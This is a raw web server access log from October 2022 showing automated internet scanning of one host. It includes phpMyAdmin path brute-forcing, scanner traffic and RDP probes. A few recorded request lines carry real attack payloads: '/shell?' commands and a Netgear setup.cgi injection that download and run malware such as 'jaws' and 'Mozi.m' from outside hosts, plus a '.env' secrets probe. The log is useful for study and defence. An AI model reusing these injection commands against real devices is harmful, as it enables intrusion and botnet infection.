192.227.140.125 - - [11/Oct/2022:23:00:47 +0000] "GET /phppma/index.php?lang=en HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
192.227.140.125 - - [11/Oct/2022:23:00:47 +0000] "GET /mysql/sqlmanager/index.php?lang=en HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
192.227.140.125 - - [11/Oct/2022:23:00:47 +0000] "GET /phpmyadmin2021/index.php?lang=en HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
192.227.140.125 - - [11/Oct/2022:23:00:47 +0000] "GET /phpMyAdmin_/index.php?lang=en HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
192.227.140.125 - - [11/Oct/2022:23:00:48 +0000] "GET /mysql/index.php?lang=en HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
192.227.140.125 - - [11/Oct/2022:23:00:48 +0000] "GET /sql/phpmy-admin/index.php?lang=en HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
192.227.140.125 - - [11/Oct/2022:23:00:48 +0000] "GET /sql/sql/index.php?lang=en HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
192.227.140.125 - - [11/Oct/2022:23:00:48 +0000] "GET /phpmyadmin2016/index.php?lang=en HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
192.227.140.125 - - [11/Oct/2022:23:00:48 +0000] "GET /phpmyadmin4/index.php?lang=en HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
192.227.140.125 - - [11/Oct/2022:23:00:48 +0000] "GET /dbadmin/index.php?lang=en HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
192.227.140.125 - - [11/Oct/2022:23:00:48 +0000] "GET /administrator/db/index.php?lang=en HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
192.227.140.125 - - [11/Oct/2022:23:00:48 +0000] "GET /sql/php-myadmin/index.php?lang=en HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
192.227.140.125 - - [11/Oct/2022:23:00:48 +0000] "GET /phpMyAdmin-4/index.php?lang=en HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
192.227.140.125 - - [11/Oct/2022:23:00:49 +0000] "GET /sql/phpmyadmin4/index.php?lang=en HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
192.227.140.125 - - [11/Oct/2022:23:00:49 +0000] "GET /phpMyAdmin-4.9.7/index.php?lang=en HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
192.227.140.125 - - [11/Oct/2022:23:00:49 +0000] "GET /phpmyadmin1/index.php?lang=en HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
192.227.140.125 - - [11/Oct/2022:23:00:49 +0000] "GET /program/index.php?lang=en HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
192.227.140.125 - - [11/Oct/2022:23:00:49 +0000] "GET /mysql/mysqlmanager/index.php?lang=en HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
192.227.140.125 - - [11/Oct/2022:23:00:49 +0000] "GET /mysql/db/index.php?lang=en HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
192.227.140.125 - - [11/Oct/2022:23:00:49 +0000] "GET /admin/phpmyadmin/index.php?lang=en HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
192.227.140.125 - - [11/Oct/2022:23:00:49 +0000] "GET /phpmyadmin2020/index.php?lang=en HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
192.227.140.125 - - [11/Oct/2022:23:00:50 +0000] "GET /admin/db/index.php?lang=en HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
192.227.140.125 - - [11/Oct/2022:23:00:50 +0000] "GET /PMA/index.php?lang=en HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
192.227.140.125 - - [11/Oct/2022:23:00:50 +0000] "GET /_phpmyadmin_/index.php?lang=en HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
192.227.140.125 - - [11/Oct/2022:23:00:50 +0000] "GET /phpmyadmin/index.php?lang=en HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
192.227.140.125 - - [11/Oct/2022:23:00:50 +0000] "GET /phpmyadmin2014/index.php?lang=en HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
192.227.140.125 - - [11/Oct/2022:23:00:50 +0000] "GET /phpMyAdmin-5/index.php?lang=en HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
192.227.140.125 - - [11/Oct/2022:23:00:50 +0000] "GET /administrator/admin/index.php?lang=en HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
192.227.140.125 - - [11/Oct/2022:23:00:50 +0000] "GET /phpmyAdmin/index.php?lang=en HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
192.227.140.125 - - [11/Oct/2022:23:00:50 +0000] "GET /sql/phpMyAdmin2/index.php?lang=en HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
192.227.140.125 - - [11/Oct/2022:23:00:51 +0000] "GET /administrator/web/index.php?lang=en HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
192.227.140.125 - - [11/Oct/2022:23:00:51 +0000] "GET /myadmin/index.php?lang=en HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
192.227.140.125 - - [11/Oct/2022:23:00:51 +0000] "GET /db/phpmyadmin/index.php?lang=en HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
192.227.140.125 - - [11/Oct/2022:23:00:51 +0000] "GET /sql/phpMyAdmin/index.php?lang=en HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
192.227.140.125 - - [11/Oct/2022:23:00:51 +0000] "GET /1phpmyadmin/index.php?lang=en HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
192.227.140.125 - - [11/Oct/2022:23:00:51 +0000] "GET /phpmyadmin2018/index.php?lang=en HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
192.227.140.125 - - [11/Oct/2022:23:00:51 +0000] "GET /phpMyAdmin4/index.php?lang=en HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
192.227.140.125 - - [11/Oct/2022:23:00:51 +0000] "GET /_phpMyAdmin/index.php?lang=en HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
192.227.140.125 - - [11/Oct/2022:23:00:51 +0000] "GET /mysqlmanager/index.php?lang=en HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
192.227.140.125 - - [11/Oct/2022:23:00:52 +0000] "GET /mysql/web/index.php?lang=en HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
192.227.140.125 - - [11/Oct/2022:23:00:52 +0000] "GET /administrator/pma/index.php?lang=en HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
192.227.140.125 - - [11/Oct/2022:23:00:52 +0000] "GET /sql/webadmin/index.php?lang=en HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
192.227.140.125 - - [11/Oct/2022:23:00:52 +0000] "GET /phpMyAdmin-5.1.3/index.php?lang=en HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
192.227.140.125 - - [11/Oct/2022:23:00:52 +0000] "GET /admin/pma/index.php?lang=en HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
192.227.140.125 - - [11/Oct/2022:23:00:52 +0000] "GET /mysql/admin/index.php?lang=en HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
192.227.140.125 - - [11/Oct/2022:23:00:52 +0000] "GET /phpMyAdmin5/index.php?lang=en HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
192.227.140.125 - - [11/Oct/2022:23:00:53 +0000] "GET /sql/phpmyadmin5/index.php?lang=en HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
192.227.140.125 - - [11/Oct/2022:23:00:53 +0000] "GET /phpmyadmin3/index.php?lang=en HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
192.227.140.125 - - [11/Oct/2022:23:00:53 +0000] "GET /phpmy/index.php?lang=en HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
192.227.140.125 - - [11/Oct/2022:23:00:53 +0000] "GET /phpmyadmin2012/index.php?lang=en HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
192.227.140.125 - - [11/Oct/2022:23:00:53 +0000] "GET /phpMyAdmin3/index.php?lang=en HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
192.227.140.125 - - [11/Oct/2022:23:00:53 +0000] "GET /db/phpMyAdmin-3/index.php?lang=en HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
192.227.140.125 - - [11/Oct/2022:23:00:53 +0000] "GET /2phpmyadmin/index.php?lang=en HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
192.227.140.125 - - [11/Oct/2022:23:00:53 +0000] "GET /phpmy-admin/index.php?lang=en HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
192.227.140.125 - - [11/Oct/2022:23:00:53 +0000] "GET /MyAdmin/index.php?lang=en HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
192.227.140.125 - - [11/Oct/2022:23:00:54 +0000] "GET /wp-content/plugins/portable-phpmyadmin/wp-pma-mod/index.php?lang=en HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
192.227.140.125 - - [11/Oct/2022:23:00:54 +0000] "GET /phpmyadmin2/index.php?lang=en HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
192.227.140.125 - - [11/Oct/2022:23:00:54 +0000] "GET /sql/sqladmin/index.php?lang=en HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
192.227.140.125 - - [11/Oct/2022:23:00:54 +0000] "GET /admin/index.php?lang=en HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
192.227.140.125 - - [11/Oct/2022:23:00:54 +0000] "GET /administrator/PMA/index.php?lang=en HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
59.98.177.220 - - [11/Oct/2022:23:12:42 +0000] "GET / HTTP/1.1" 404 552 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
185.180.143.7 - - [11/Oct/2022:23:35:10 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
45.227.254.55 - - [11/Oct/2022:23:46:00 +0000] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 154 "-" "-"
45.227.254.55 - - [11/Oct/2022:23:46:00 +0000] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 154 "-" "-"
198.98.59.132 - - [11/Oct/2022:23:52:12 +0000] "GET / HTTP/1.1" 404 150 "-" "Hello World"
151.241.119.4 - - [11/Oct/2022:23:57:38 +0000] "GET / HTTP/1.1" 404 150 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
37.252.206.220 - - [11/Oct/2022:23:57:47 +0000] "GET /shell?cd+/tmp;+wget+http:/\x5C/46.19.141.122/jaws;+chmod+777+jaws;+sh+jaws;rm+-rf+jaws HTTP/1.1" 404 150 "-" "Hello, Momentum"
162.221.192.26 - - [12/Oct/2022:00:13:54 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
104.152.52.164 - - [12/Oct/2022:00:32:00 +0000] "GET / HTTP/1.0" 404 150 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)"
45.61.185.198 - - [12/Oct/2022:00:36:28 +0000] "GET /config/getuser?index=0 HTTP/1.1" 404 122 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
80.94.92.231 - - [12/Oct/2022:01:02:45 +0000] "GET / HTTP/1.1" 404 150 "-" "-"
162.62.191.231 - - [12/Oct/2022:01:30:14 +0000] "GET / HTTP/1.1" 404 150 "-" "curl/7.64.1"
195.178.120.55 - - [12/Oct/2022:01:50:51 +0000] "GET / HTTP/1.1" 404 122 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
192.241.218.174 - - [12/Oct/2022:02:09:14 +0000] "GET /druid/index.html HTTP/1.1" 404 122 "-" "Mozilla/5.0 zgrab/0.x"
172.105.89.161 - - [12/Oct/2022:02:18:17 +0000] "GET /0bef HTTP/1.0" 404 150 "-" "-"
91.211.91.188 - - [12/Oct/2022:02:18:36 +0000] "GET / HTTP/1.1" 404 122 "-" "Mozilla/5.0 zgrab/0.x"
184.105.139.68 - - [12/Oct/2022:03:02:13 +0000] "GET / HTTP/1.1" 404 150 "-" "-"
198.98.59.132 - - [12/Oct/2022:03:40:10 +0000] "GET / HTTP/1.1" 404 150 "-" "Hello World"
193.106.29.122 - - [12/Oct/2022:04:22:43 +0000] "GET / HTTP/1.0" 404 150 "-" "Mozilla/5.0"
220.123.89.125 - - [12/Oct/2022:04:40:57 +0000] "GET / HTTP/1.0" 404 552 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)"
45.61.186.4 - - [12/Oct/2022:04:56:29 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 122 "http://84.185.48.86:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
45.61.186.4 - - [12/Oct/2022:04:56:29 +0000] "" 400 0 "-" "-"
45.143.200.118 - - [12/Oct/2022:04:57:14 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 154 "-" "-"
192.241.217.91 - - [12/Oct/2022:05:08:20 +0000] "MGLNDD_84.185.48.86_80" 400 154 "-" "-"
143.255.243.189 - - [12/Oct/2022:05:55:18 +0000] "GET / HTTP/1.1" 404 552 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
128.14.209.162 - - [12/Oct/2022:05:57:39 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
147.124.222.183 - - [12/Oct/2022:06:05:34 +0000] "GET / HTTP/1.1" 404 122 "-" "Linux Gnu (cow)"
192.241.219.31 - - [12/Oct/2022:06:27:57 +0000] "GET / HTTP/1.1" 404 122 "-" "Mozilla/5.0 zgrab/0.x"
111.19.191.69 - - [12/Oct/2022:06:48:21 +0000] "GET / HTTP/1.1" 400 154 "-" "-"
41.40.248.161 - - [12/Oct/2022:06:54:29 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+81.161.229.46/jaws;sh+/tmp/jaws HTTP/1.1" 404 150 "-" "Hello, world"
89.248.163.228 - - [12/Oct/2022:07:45:39 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 154 "-" "-"
198.98.59.132 - - [12/Oct/2022:09:00:47 +0000] "GET / HTTP/1.1" 404 150 "-" "Hello World"
195.178.120.69 - - [12/Oct/2022:09:03:46 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 122 "http://84.185.48.86:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.178.120.69 - - [12/Oct/2022:09:03:46 +0000] "" 400 0 "-" "-"
45.61.185.198 - - [12/Oct/2022:09:13:32 +0000] "GET /config/getuser?index=0 HTTP/1.1" 404 122 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
162.221.192.26 - - [12/Oct/2022:09:13:38 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
77.237.185.126 - - [12/Oct/2022:09:26:10 +0000] "GET / HTTP/1.1" 404 552 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
80.94.92.231 - - [12/Oct/2022:09:44:47 +0000] "GET / HTTP/1.1" 404 150 "-" "-"
45.61.187.18 - - [12/Oct/2022:09:50:46 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 122 "http://84.185.48.86:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
45.61.187.18 - - [12/Oct/2022:09:50:46 +0000] "" 400 0 "-" "-"
34.78.6.216 - - [12/Oct/2022:10:10:14 +0000] "GET / HTTP/1.1" 404 122 "-" "python-requests/2.28.1"
60.191.125.35 - - [12/Oct/2022:10:38:12 +0000] "HEAD http://112.124.42.80:63435/ HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"
195.178.120.55 - - [12/Oct/2022:10:47:14 +0000] "GET / HTTP/1.1" 404 122 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
92.118.39.30 - - [12/Oct/2022:10:55:43 +0000] "\x01\x03\x00\x1F\x00\x00\x00hello\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00world\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" 400 154 "-" "-"
45.143.200.118 - - [12/Oct/2022:11:45:35 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 154 "-" "-"
193.234.119.21 - - [12/Oct/2022:11:59:01 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://193.234.119.21:56773/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 150 "-" "-"
205.210.31.167 - - [12/Oct/2022:12:10:22 +0000] "GET / HTTP/1.1" 404 150 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
198.235.24.135 - - [12/Oct/2022:13:35:02 +0000] "GET / HTTP/1.0" 404 150 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
190.99.94.158 - - [12/Oct/2022:14:07:59 +0000] "GET / HTTP/1.0" 404 150 "-" "-"
213.226.117.2 - - [12/Oct/2022:14:21:34 +0000] "GET /.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
213.226.117.2 - - [12/Oct/2022:14:21:35 +0000] "\x16\x03\x01\x01H\x01\x00\x01D\x03\x03\xEC\x9Fu\x7F\x9B\xF0KY3Q\xEA\xCCB{\xFE\x09\xDD.\x9C\xA3\xD0\xC7\xE7.\xD4\x8E,\xD1,\xFB\xC7c v\xAA]\xB5+_\xF2\xCE\xB1Va\xA6\xEA\x00Q\xAEx\xF4\xCD\xFA\x8F\x85\xF1\x05\x9C%\xD0" 400 154 "-" "-"
80.94.92.239 - - [12/Oct/2022:14:27:35 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
35.216.225.215 - - [12/Oct/2022:14:46:46 +0000] "GET / HTTP/1.1" 404 122 "-" "Mozilla/5.0"
167.94.138.62 - - [12/Oct/2022:15:46:31 +0000] "GET / HTTP/1.1" 404 150 "-" "-"
167.94.138.62 - - [12/Oct/2022:15:46:31 +0000] "GET / HTTP/1.1" 404 122 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
